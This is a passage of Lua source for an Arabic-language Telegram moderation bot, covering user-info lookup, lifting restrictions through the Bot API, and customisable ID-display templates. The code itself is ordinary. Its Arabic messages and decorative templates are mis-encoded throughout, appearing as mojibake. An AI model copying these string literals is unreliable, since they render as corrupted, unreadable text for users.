sudobot = '\nโ๏ธฐุนุฏุฏ ุงููุฑูุจุงุช โข '..(DevRio:get(Rinda..'Rio:Sudos'..result.sender_user_id_) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(result.sender_user_id_,msg.chat_id_) ~= false then
CustomTitle = '\nโ๏ธฐููุจู โข '..GetCustomTitle(result.sender_user_id_,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐุงูุญุณุงุจ ูุญุฐูู', 1, 'md')
return false  end
if data.username_ == false then
Text = 'โ๏ธฐุงุณูู โข ['..data.first_name_..'](tg://user?id='..result.sender_user_id_..')\nโ๏ธฐุงูุฏูู โข โจ `'..result.sender_user_id_..'` โฉ\nโ๏ธฐุฑุชุจุชู โข '..IdRank(result.sender_user_id_, msg.chat_id_)..sudobot..'\nโ๏ธฐุฑุณุงุฆูู โข โจ '..user_msgs..' โฉ\nโ๏ธฐุชูุงุนูู โข '..formsgs(user_msgs)..CustomTitle..'\nโ๏ธฐููุงุทู โข โจ '..user_nkt..' โฉ'..Tked
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุนุฑูู โข [@'..data.username_..']\nโ๏ธฐุงูุฏูู โข โจ `'..result.sender_user_id_..'` โฉ\nโ๏ธฐุฑุชุจุชู โข '..IdRank(result.sender_user_id_, msg.chat_id_)..sudobot..'\nโ๏ธฐุฑุณุงุฆูู โข โจ '..user_msgs..' โฉ\nโ๏ธฐุชูุงุนูู โข '..formsgs(user_msgs)..CustomTitle..'\nโ๏ธฐููุงุทู โข โจ '..user_nkt..' โฉ'..Tked, 1, 'md')
end
end,nil)
end 
getMessage(msg.chat_id_, msg.reply_to_message_id_,id_by_reply) 
end
if text and text:match('^ูุดู @(.*)') and ChCheck(msg) or text and text:match('^ุงูุฏู @(.*)') and ChCheck(msg) then 
local username = text:match('^ูุดู @(.*)') or text:match('^ุงูุฏู @(.*)')
tdcli_function ({ID = "SearchPublicChat",username_ = username},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
return false  end
if res.type_.ID == "ChannelChatInfo" then 
if res.type_.channel_.is_supergroup_ == false then
local ch = 'ููุงุฉ'
local chn = 'โ๏ธฐููุน ุงูุญุณุงุจ โข โจ '..ch..' โฉ\nโ๏ธฐุงูุงูุฏู โข โจ `'..res.id_..'` โฉ\nโ๏ธฐุงููุนุฑู โข โจ [@'..username..'] โฉ\nโ๏ธฐุงูุงุณู โข โจ ['..res.title_..'] โฉ'
Dev_Rio(msg.chat_id_, msg.id_, 1,chn, 1, 'md')
else
local gr = 'ูุฌููุนู'
local grr = 'โ๏ธฐููุน ุงูุญุณุงุจ โข โจ '..gr..' โฉ\nโ๏ธฐุงูุงูุฏู โข โจ '..res.id_..' โฉ\nโ๏ธฐุงููุนุฑู โข โจ [@'..username..'] โฉ\nโ๏ธฐุงูุงุณู โข โจ ['..res.title_..'] โฉ'
Dev_Rio(msg.chat_id_, msg.id_, 1,grr, 1, 'md')
end
return false  end
if res.id_ then  
tdcli_function ({ID = "GetUser",user_id_ = res.id_},function(arg,data) 
local user_msgs = DevRio:get(Rinda..'Rio:UsersMsgs'..msg.chat_id_..':'..res.id_) or 0
local user_nkt = tonumber(DevRio:get(Rinda..'Rio:GamesNumber'..msg.chat_id_..res.id_) or 0)
if DevRio:sismember(Rinda..'Rio:BanAll:',res.id_) then
Tkeed = 'ูุญุธูุฑ ุนุงู'
elseif DevRio:sismember(Rinda..'Rio:MuteAll:',res.id_) then
Tkeed = 'ููุชูู ุนุงู'
elseif DevRio:sismember(Rinda..'Rio:Ban:'..msg.chat_id_,res.id_) then
Tkeed = 'ูุญุธูุฑ'
elseif DevRio:sismember(Rinda..'Rio:Muted:'..msg.chat_id_,res.id_) then
Tkeed = 'ููุชูู'
elseif DevRio:sismember(Rinda..'Rio:Tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'ูููุฏ'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\nโ๏ธฐุงููููุฏ โข '..Tkeed
else 
Tked = '' 
end
if DevRio:sismember(Rinda..'Rio:SudoBot:',res.id_) and SudoBot(msg) then
sudobot = '\nโ๏ธฐุนุฏุฏ ุงููุฑูุจุงุช โข '..(DevRio:get(Rinda..'Rio:Sudos'..res.id_) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(res.id_,msg.chat_id_) ~= false then
CustomTitle = '\nโ๏ธฐููุจู โข '..GetCustomTitle(res.id_,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐุงูุญุณุงุจ ูุญุฐูู', 1, 'md')
return false  end
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุนุฑูู โข [@'..data.username_..']\nโ๏ธฐุงูุฏูู โข โจ `'..res.id_..'` โฉ\nโ๏ธฐุฑุชุจุชู โข '..IdRank(res.id_, msg.chat_id_)..sudobot..'\nโ๏ธฐุฑุณุงุฆูู โข โจ '..user_msgs..' โฉ\nโ๏ธฐุชูุงุนูู โข '..formsgs(user_msgs)..CustomTitle..'\nโ๏ธฐููุงุทู โข โจ '..user_nkt..' โฉ'..Tked, 1, 'md')
end,nil)
end 
end,nil)
return false 
end
if text and text:match('ูุดู (%d+)') and ChCheck(msg) or text and text:match('ุงูุฏู (%d+)') and ChCheck(msg) then 
local iduser = text:match('ูุดู (%d+)') or text:match('ุงูุฏู (%d+)')  
tdcli_function ({ID = "GetUser",user_id_ = iduser},function(arg,data) 
if data.message_ == "User not found" then
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูู ูุชู ุงูุชุนุฑู ุนูู ุงูุญุณุงุจ', 1, 'md')
return false  
end
local user_msgs = DevRio:get(Rinda..'Rio:UsersMsgs'..msg.chat_id_..':'..iduser) or 0
local user_nkt = tonumber(DevRio:get(Rinda..'Rio:GamesNumber'..msg.chat_id_..iduser) or 0)
if DevRio:sismember(Rinda..'Rio:BanAll:',iduser) then
Tkeed = 'ูุญุธูุฑ ุนุงู'
elseif DevRio:sismember(Rinda..'Rio:MuteAll:',iduser) then
Tkeed = 'ููุชูู ุนุงู'
elseif DevRio:sismember(Rinda..'Rio:Ban:'..msg.chat_id_,iduser) then
Tkeed = 'ูุญุธูุฑ'
elseif DevRio:sismember(Rinda..'Rio:Muted:'..msg.chat_id_,iduser) then
Tkeed = 'ููุชูู'
elseif DevRio:sismember(Rinda..'Rio:Tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'ูููุฏ'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\nโ๏ธฐุงููููุฏ โข '..Tkeed
else 
Tked = '' 
end
if DevRio:sismember(Rinda..'Rio:SudoBot:',iduser) and SudoBot(msg) then
sudobot = '\nโ๏ธฐุนุฏุฏ ุงููุฑูุจุงุช โข '..(DevRio:get(Rinda..'Rio:Sudos'..iduser) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(iduser,msg.chat_id_) ~= false then
CustomTitle = '\nโ๏ธฐููุจู โข '..GetCustomTitle(iduser,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐุงูุญุณุงุจ ูุญุฐูู', 1, 'md')
return false  end
if data.username_ == false then
Text = 'โ๏ธฐุงุณูู โข ['..data.first_name_..'](tg://user?id='..iduser..')\nโ๏ธฐุงูุฏูู โข โจ `'..iduser..'` โฉ\nโ๏ธฐุฑุชุจุชู โข '..IdRank(data.id_, msg.chat_id_)..sudobot..'\nโ๏ธฐุฑุณุงุฆูู โข โจ '..user_msgs..' โฉ\nโ๏ธฐุชูุงุนูู โข '..formsgs(user_msgs)..CustomTitle..'\nโ๏ธฐููุงุทู โข โจ '..user_nkt..' โฉ'..Tked
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุนุฑูู โข [@'..data.username_..']\nโ๏ธฐุงูุฏูู โข โจ `'..iduser..'` โฉ\nโ๏ธฐุฑุชุจุชู โข '..IdRank(data.id_, msg.chat_id_)..sudobot..'\nโ๏ธฐุฑุณุงุฆูู โข โจ '..user_msgs..' โฉ\nโ๏ธฐุชูุงุนูู โข '..formsgs(user_msgs)..CustomTitle..'\nโ๏ธฐููุงุทู โข โจ '..user_nkt..' โฉ'..Tked, 1, 'md')
end
end,nil)
return false 
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ูุดู ุงููููุฏ' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) and ChCheck(msg) then 
function kshf_by_reply(extra, result, success)
if DevRio:sismember(Rinda..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'ููุชูู' else muted = 'ุบูุฑ ููุชูู' end
if DevRio:sismember(Rinda..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'ูุญุธูุฑ' else banned = 'ุบูุฑ ูุญุธูุฑ' end
if DevRio:sismember(Rinda..'Rio:BanAll:',result.sender_user_id_) then banall = 'ูุญุธูุฑ ุนุงู' else banall = 'ุบูุฑ ูุญุธูุฑ ุนุงู' end
if DevRio:sismember(Rinda..'Rio:MuteAll:',result.sender_user_id_) then muteall = 'ููุชูู ุนุงู' else muteall = 'ุบูุฑ ููุชูู ุนุงู' end
if DevRio:sismember(Rinda..'Rio:Tkeed:',result.sender_user_id_) then tkeed = 'ูููุฏ' else tkeed = 'ุบูุฑ ูููุฏ' end
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุญุธุฑ ุงูุนุงู โข '..banall..'\nโ๏ธฐุงููุชู ุงูุนุงู โข '..muteall..'\nโ๏ธฐุงูุญุธุฑ โข '..banned..'\nโ๏ธฐุงููุชู โข '..muted..'\nโ๏ธฐุงูุชููุฏ โข '..tkeed, 1, 'md')  
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kshf_by_reply) 
end
if text and text:match('^ูุดู ุงููููุฏ @(.*)') and Admin(msg) and ChCheck(msg) then 
local username = text:match('^ูุดู ุงููููุฏ @(.*)') 
function kshf_by_username(extra, result, success)
if result.id_ then
if DevRio:sismember(Rinda..'Rio:Muted:'..msg.chat_id_,result.id_) then muted = 'ููุชูู' else muted = 'ุบูุฑ ููุชูู' end
if DevRio:sismember(Rinda..'Rio:Ban:'..msg.chat_id_,result.id_) then banned = 'ูุญุธูุฑ' else banned = 'ุบูุฑ ูุญุธูุฑ' end
if DevRio:sismember(Rinda..'Rio:BanAll:',result.id_) then banall = 'ูุญุธูุฑ ุนุงู' else banall = 'ุบูุฑ ูุญุธูุฑ ุนุงู' end
if DevRio:sismember(Rinda..'Rio:MuteAll:',result.id_) then muteall = 'ููุชูู ุนุงู' else muteall = 'ุบูุฑ ููุชูู ุนุงู' end
if DevRio:sismember(Rinda..'Rio:Tkeed:',result.id_) then tkeed = 'ูููุฏ' else tkeed = 'ุบูุฑ ูููุฏ' end
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุญุธุฑ ุงูุนุงู โข '..banall..'\nโ๏ธฐุงููุชู ุงูุนุงู โข '..muteall..'\nโ๏ธฐุงูุญุธุฑ โข '..banned..'\nโ๏ธฐุงููุชู โข '..muted..'\nโ๏ธฐุงูุชููุฏ โข '..tkeed, 1, 'md')  
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')  
end
end
resolve_username(username,kshf_by_username) 
end
if text == 'ุฑูุน ุงููููุฏ' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) and ChCheck(msg) then 
function unbanreply(extra, result, success) 
if tonumber(result.sender_user_id_) == tonumber(Rinda) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุง ุงูุจูุช ูููุณ ูุฏู ูููุฏ', 1, 'md')  
return false  
end 
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุฑูุน ูููุฏู") 
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(Rinda..'Rio:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(Rinda..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(Rinda..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(Rinda..'Rio:BanAll:',result.sender_user_id_) DevRio:srem(Rinda..'Rio:MuteAll:',result.sender_user_id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(Rinda..'Rio:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(Rinda..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(Rinda..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
end
if text and text:match('^ุฑูุน ุงููููุฏ (%d+)') and Admin(msg) and ChCheck(msg) then 
local user = text:match('ุฑูุน ุงููููุฏ (%d+)') 
if tonumber(user) == tonumber(Rinda) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุง ุงูุจูุช ูููุณ ูุฏู ูููุฏ', 1, 'md')  
return false  
end 
tdcli_function ({ID = "GetUser",user_id_ = user},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูู ุงุณุชุทุน ุงุณุชุฎุฑุงุฌ ุงููุนูููุงุช', 1, 'md') 
return false  
end
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุฑูุน ูููุฏู") 
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(Rinda..'Rio:Tkeed:'..msg.chat_id_,user) DevRio:srem(Rinda..'Rio:Ban:'..msg.chat_id_,user) DevRio:srem(Rinda..'Rio:Muted:'..msg.chat_id_,user) DevRio:srem(Rinda..'Rio:BanAll:',user) DevRio:srem(Rinda..'Rio:MuteAll:',user)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(Rinda..'Rio:Tkeed:'..msg.chat_id_,user) DevRio:srem(Rinda..'Rio:Ban:'..msg.chat_id_,user) DevRio:srem(Rinda..'Rio:Muted:'..msg.chat_id_,user) 
end  
end,nil)  
end
if text and text:match('^ุฑูุน ุงููููุฏ @(.*)') and Admin(msg) and ChCheck(msg) then  
local username = text:match('ุฑูุน ุงููููุฏ @(.*)')  
function unbanusername(extra,result,success)  
if result and result.message_ and result.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')  
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุฐุง ูุนุฑู ููุงุฉ ูููุณ ูุนุฑู ุญุณุงุจ', 1, 'md') 
return false  
end
if tonumber(result.id_) == tonumber(Rinda) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุง ุงูุจูุช ูููุณ ูุฏู ูููุฏ', 1, 'md')  
return false  
end 
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูู ุงุณุชุทุน ุงุณุชุฎุฑุงุฌ ุงููุนูููุงุช', 1, 'md') 
return false  
end
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุฑูุน ูููุฏู") 
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(Rinda..'Rio:Tkeed:'..msg.chat_id_,result.id_) DevRio:srem(Rinda..'Rio:Ban:'..msg.chat_id_,result.id_) DevRio:srem(Rinda..'Rio:Muted:'..msg.chat_id_,result.id_) DevRio:srem(Rinda..'Rio:BanAll:',result.id_) DevRio:srem(Rinda..'Rio:MuteAll:',result.id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(Rinda..'Rio:Tkeed:'..msg.chat_id_,result.id_) DevRio:srem(Rinda..'Rio:Ban:'..msg.chat_id_,result.id_) DevRio:srem(Rinda..'Rio:Muted:'..msg.chat_id_,result.id_) 
end
end,nil)   
end  
resolve_username(username,unbanusername) 
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if Manager(msg) then
if text and text:match("^ุชุบููุฑ ุงูุงูุฏู$") and ChCheck(msg) or text and text:match("^ุชุบูุฑ ุงูุงูุฏู$") and ChCheck(msg) then 
local List = {
[[
ใ?๐๐๐ด๐ ๐จ #username ๐ฅฒ .
ใ?๐ผ๐๐ถ ๐จ #msgs ๐ฅฒ .
ใ?๐๐๐ฐ ๐จ #stast ๐ฅฒ .
ใ?๐ธ๐ณ ๐จ #id ๐ฅฒ .
]],
[[
โญ- ๐๐๐๐ #stast ๐ฏ. ๐
โฎ- ๐๐๐๐๐ #username ๐ฏ. ๐
โญ- ๐๐๐๐๐ #msgs ๐ฏ. ๐
โญ- ๐๐ ๐ #id ๐ฏ. ๐
]],
[[
โ ๐ฐ ๐พ๐๐๐๐๐๐ ๐ป๐ ๐ฎ๐๐๐๐ โ
โข ๐ค | ๐ผ๐ฌ๐บ : #username โโโโ
โข ๐ค | ๐บ๐ป๐จ : #stast ๐ง๐ปโโ๏ธ โฅ
โข ๐ค | ๐ฐ๐ซ : #id โโโโ
โข ๐ค | ๐ด๐บ๐ฎ : #msgs ๐
]],
[[
โ ๐๐๐๐ ๐คฑ #username ๐ฆด .
โ ๐๐๐ ๐คฑ #msgs ๐ฆด .
โ ๐๐๐ ๐คฑ #stast ๐ฆด .
โ ๐๐ ๐คฑ #id ๐ฆด .
]],
[[
๐ผ๐ฎ๐ถ ๐ผ๐๐๐๐ต๐๐๐ : #username 
๐ผ๐ฎ๐ถ ๐บ๐๐๐๐ : #stast 
๐ผ๐ฎ๐ถ ๐๐ : #id 
๐ผ๐ฎ๐ถ ๐ฎ๐๐๐๐บ : #game 
๐ผ๐ฎ๐ถ ๐ด๐๐๐ : #msgs
]],
[[
โ: ๐๐๐๐ #stast ๐ฏโธ๐.
โ: ๐๐๐๐๐ #username ๐ฏโธ๐.
โ: ๐๐๐๐๐ #msgs ๐ฏโธ๐.
โ: ๐๐ ๐ #id ๐ฏโธ๐.
]],
[[
โโข๐ฎ๐ฌ๐๐ซ : #username ๐ฃฌ  
โโข๐ฆ๐ฌ๐?  : #msgs ๐ฃฌ 
โโข๐ฌ๐ญ๐ : #stast ๐ฃฌ 
โโข๐ข๐  : #id ๐ฃฌ
]],
[[
- ๐ฌ ๐๐ฌ๐๐ซ : #username ๐ .
- ๐ฌ ๐๐ฌ๐  : #msgs ๐ .
- ๐ฌ ๐๐ญ๐ : #stast ๐ .
- ๐ฌ ๐๐ : #id ๐ .
]],
[[
.๐ฃ ๐ช๐จ๐๐ง๐ฃ๐๐ข๐ , #username  
.๐ฃ ๐จ๐ฉ๐๐จ๐ฉ , #stast  
.๐ฃ ๐ก๐ฟ , #id  
.๐ฃ ๐๐๐ข๐จ , #game 
.๐ฃ ๐ข๐จ๐๐จ , #msgs
]],
[[
โ๏ธฐ๐๐๐๐ โฌ #username 
โ๏ธฐ๐๐ โฌ #id
โ๏ธฐ๐๐๐๐๐ โฌ #stast
โ๏ธฐ๐๐๐๐ โฌ #cont 
โ๏ธฐ๐๐๐๐ โฌ #msgs
โ๏ธฐ๐๐๐๐ โฌ #game
]],
[[
แฏ ๐จ๐ฆ๐๐ฅ๐ก๐ฎ๐บ๐ . #username ๐บ๐ธ ๊ฐ
แฏ ๐ฆ๐ง๐ฎ๐ฆ๐ง . #stast ๐บ๐ธ ๊ฐ
แฏ ๐๐ . #id ๐บ๐ธ ๊ฐ
แฏ ๐๐ฎ๐บ๐๐ฆ . #game ๐บ๐ธ ๊ฐ
แฏ ๐บ๐ฆ๐๐ฆ . #msgs ๐บ๐ธ ๊ฐ
]],
[[
- แดัแดสษดแดแดแด โฅโข #username .
- แดัษขั โฅโข #msgs .
- ัแดแดแดั โฅโข #stast .
- สแดแดส ษชแด โฅโข #id  .
- แดแดษชแด แดsษข โฅโข #edit .
- แดแดแดแดษชสs โฅโข #auto . 
- ษขแดแดแด โฅโข #game .
]]}
local Text_Rand = List[math.random(#List)]
DevRio:set(Rinda.."Rio:GpIds:Text"..msg.chat_id_,Text_Rand)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุชุบูุฑ ูููุดุฉ ุงูุงูุฏู")  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if SecondSudo(msg) then
if text and text:match("^ุชุนููู ุงูุงูุฏู ุงูุนุงู$") or text and text:match("^ุชุนูู ุงูุงูุฏู ุงูุนุงู$") or text and text:match("^ุชุนููู ูููุดุฉ ุงูุงูุฏู$") then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุฑุฌุงุฆุง ุงุชุจุน ุงูุชุนูููุงุช ููุชุนููู \nโ๏ธฐูุทุจุน ูููุดุฉ ุงูุงูุฏู ุงุฑุณู ูููุดู ุชุญุชูู ุนูู ุงููุตูุต ุงูุชู ุจุงููุบู ุงูุงูุฌููุฒูู ุงุฏูุงู โข โค\n-----------------------------------------\n `#username` โฌ ูุทุจุน ุงููุนุฑู\n `#id` โฌ ูุทุจุน ุงูุงูุฏู \n `#photos` โฌ ูุทุจุน ุนุฏุฏ ุงูุตูุฑ \n `#stast` โฌ ูุทุจุน ุงูุฑุชุจ \n `#msgs` โฌ ูุทุจุน ุนุฏุฏ ุงูุฑุณุงุฆู \n `#msgday` โฌ ูุทุจุน ุงูุฑุณุงุฆู ุงูููููู \n `#CustomTitle` โฌ ูุทุจุน ุงูููุจ \n `#bio` โฌ ูุทุจุน ุงูุจุงูู \n `#auto` โฌ ูุทุจุน ุงูุชูุงุนู \n `#game` โฌ ูุทุจุน ุนุฏุฏ ุงูููุงุท \n `#cont` โฌ ูุทุจุน ุนุฏุฏ ุงูุฌูุงุช \n `#edit` โฌ ูุทุจุน ุนุฏุฏ ุงูุณุญูุงุช \n `#Description` โฌ ูุทุจุน ุชุนููู ุงูุตูุฑ\n-----------------------------------------', 1, 'md')
DevRio:set("Rinda:New:id:"..Rinda..msg.sender_user_id_,'RindaTeam')
return "RindaTeam"
end
if text and DevRio:get("Rinda:New:id:"..Rinda..msg.sender_user_id_) then 
if text == 'ุงูุบุงุก' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงูุบุงุก ุญูุธ ูููุดุฉ ุงูุงูุฏู', 1, 'md')
DevRio:del("Rinda:New:id:"..Rinda..msg.sender_user_id_)
return false
end
DevRio:del("Rinda:New:id:"..Rinda..msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุญูุธ ูููุดุฉ ุงูุงูุฏู ุงูุนุงูู', 1, 'md')
DevRio:set(Rinda.."Rio:AllIds:Text",text)
return false
end
if text and text:match("^ุญุฐู ุงูุงูุฏู ุงูุนุงู$") or text and text:match("^ูุณุญ ุงูุงูุฏู ุงูุนุงู$") or text and text:match("^ุญุฐู ูููุดุฉ ุงูุงูุฏู$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ูููุดุฉ ุงูุงูุฏู ุงูุนุงูู")  
DevRio:del(Rinda.."Rio:AllIds:Text")
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match("^ุชุนููู ุงูุงูุฏู$") and ChCheck(msg) or text and text:match("^ุชุนูู ุงูุงูุฏู$") and ChCheck(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุฑุฌุงุฆุง ุงุชุจุน ุงูุชุนูููุงุช ููุชุนููู \nโ๏ธฐูุทุจุน ูููุดุฉ ุงูุงูุฏู ุงุฑุณู ูููุดู ุชุญุชูู ุนูู ุงููุตูุต ุงูุชู ุจุงููุบู ุงูุงูุฌููุฒูู ุงุฏูุงู โข โค\n-----------------------------------------\n `#username` โฌ ูุทุจุน ุงููุนุฑู\n `#id` โฌ ูุทุจุน ุงูุงูุฏู \n `#photos` โฌ ูุทุจุน ุนุฏุฏ ุงูุตูุฑ \n `#stast` โฌ ูุทุจุน ุงูุฑุชุจ \n `#msgs` โฌ ูุทุจุน ุนุฏุฏ ุงูุฑุณุงุฆู \n `#msgday` โฌ ูุทุจุน ุงูุฑุณุงุฆู ุงูููููู \n `#CustomTitle` โฌ ูุทุจุน ุงูููุจ \n `#bio` โฌ ูุทุจุน ุงูุจุงูู \n `#auto` โฌ ูุทุจุน ุงูุชูุงุนู \n `#game` โฌ ูุทุจุน ุนุฏุฏ ุงูููุงุท \n `#cont` โฌ ูุทุจุน ุนุฏุฏ ุงูุฌูุงุช \n `#edit` โฌ ูุทุจุน ุนุฏุฏ ุงูุณุญูุงุช \n `#Description` โฌ ูุทุจุน ุชุนููู ุงูุตูุฑ\n-----------------------------------------', 1, 'md')
DevRio:set("Rinda:New:id:"..Rinda..msg.chat_id_..msg.sender_user_id_,'RindaTeam')
return "RindaTeam"
end
if text and Manager(msg) and DevRio:get("Rinda:New:id:"..Rinda..msg.chat_id_..msg.sender_user_id_) then 
if text == 'ุงูุบุงุก' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงูุบุงุก ุญูุธ ูููุดุฉ ุงูุงูุฏู', 1, 'md')
DevRio:del("Rinda:New:id:"..Rinda..msg.chat_id_..msg.sender_user_id_)
return false
end
DevRio:del("Rinda:New:id:"..Rinda..msg.chat_id_..msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุญูุธ ุงููููุดู ุงูุฌุฏูุฏู', 1, 'md')
DevRio:set(Rinda.."Rio:GpIds:Text"..msg.chat_id_,text)
return false
end
if text and text:match("^ุญุฐู ุงูุงูุฏู$") and ChCheck(msg) or text and text:match("^ูุณุญ ุงูุงูุฏู$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ูููุดุฉ ุงูุงูุฏู")  
DevRio:del(Rinda.."Rio:GpIds:Text"..msg.chat_id_)
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if msg.reply_to_message_id_ ~= 0 then
return ""
else
if text and (text:match("^ุงูุฏู$") or text:match("^id$") or text:match("^Id$")) and ChCheck(msg) then
function RindaTeam(extra,rio,success)
if rio.username_ then username = '@'..rio.username_ else username = 'ูุง ููุฌุฏ' end
if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) ~= false then CustomTitle = GetCustomTitle(msg.sender_user_id_,msg.chat_id_) else CustomTitle = 'ูุง ููุฌุฏ' end
local function getpro(extra, rio, success) 
local msgsday = DevRio:get(Rinda..'Rio:UsersMsgs'..Rinda..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local edit_msg = DevRio:get(Rinda..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevRio:get(Rinda..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local user_nkt = tonumber(DevRio:get(Rinda..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(DevRio:get(Rinda..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local msguser = tonumber(DevRio:get(Rinda..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
